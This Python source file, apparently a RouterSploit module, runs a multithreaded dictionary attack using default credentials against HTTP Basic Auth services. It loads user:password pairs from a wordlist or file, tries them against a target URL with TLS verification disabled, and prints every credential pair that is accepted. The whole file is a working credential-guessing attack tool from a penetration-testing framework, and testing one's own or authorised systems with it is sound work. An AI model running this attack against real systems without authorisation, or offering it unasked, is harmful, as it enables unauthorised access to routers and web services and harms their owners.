import threading
import requests

from routersploit import (
    exploits,
    wordlists,
    print_status,
    print_error,
    LockedIterator,
    print_success,
    print_table,
    sanitize_url,
    boolify,
)


class Exploit(exploits.Exploit):
    """
    Module perform dictionary attack with default credentials against HTTP Basic Auth service.
    If valid credentials are found, they are displayed to the user.
    """
    __info__ = {
        'name': 'HTTP Basic Default Creds',
        'author': [
            'Marcin Bury <marcin.bury[at]reverse-shell.com>'  # routersploit module
        ]
    }

    target = exploits.Option('', 'Target address e.g. http://192.168.1.1')
    port = exploits.Option(80, 'Target port') 
    threads = exploits.Option(8, 'Number of threads')
    defaults = exploits.Option(wordlists.defaults, 'User:Pass or file with default credentials (file://)')
    path = exploits.Option('/', 'URL Path')
    verbosity = exploits.Option('yes', 'Display authentication attempts')

    credentials = []

    def run(self):
        self.credentials = []
        url = sanitize_url("{}:{}{}".format(self.target, self.port, self.path))

        try:
            r = requests.get(url, verify=False)
        except (requests.exceptions.MissingSchema, requests.exceptions.InvalidSchema):
            print_error("Invalid URL format: %s" % url)
            return
        except requests.exceptions.ConnectionError:
            print_error("Connection error: %s" % url)
            return

        if r.status_code != 401:
            print_status("Target is not protected by Basic Auth")
            return

        if self.defaults.startswith('file://'):
            defaults = open(self.defaults[7:], 'r')
        else:
            defaults = [self.defaults]

        collection = LockedIterator(defaults)
        self.run_threads(self.threads, self.target_function, collection)

        if len(self.credentials):
            print_success("Credentials found!")
            headers = ("Login", "Password")
            print_table(headers, *self.credentials)
        else:
            print_error("Credentials not found")

    def target_function(self, running, data):
        module_verbosity = boolify(self.verbosity)
        name = threading.current_thread().name
        url = sanitize_url("{}:{}{}".format(self.target, self.port, self.path))

        print_status(name, 'process is starting...', verbose=module_verbosity)

        while running.is_set():
            try:
                line = data.next().split(":")
                user = line[0].encode('utf-8').strip()
                password = line[1].encode('utf-8').strip()
                r = requests.get(url, auth=(user, password), verify=False)

                if r.status_code != 401:
                    running.clear()
                    print_success("{}: Authentication succeed!".format(name), user, password, verbose=module_verbosity)
                    self.credentials.append((user, password))
                else:
                    print_error(name, "Authentication Failed - Username: '{}' Password: '{}'".format(user, password), verbose=module_verbosity)
            except StopIteration:
                break

        print_status(name, 'process is terminated.', verbose=module_verbosity)
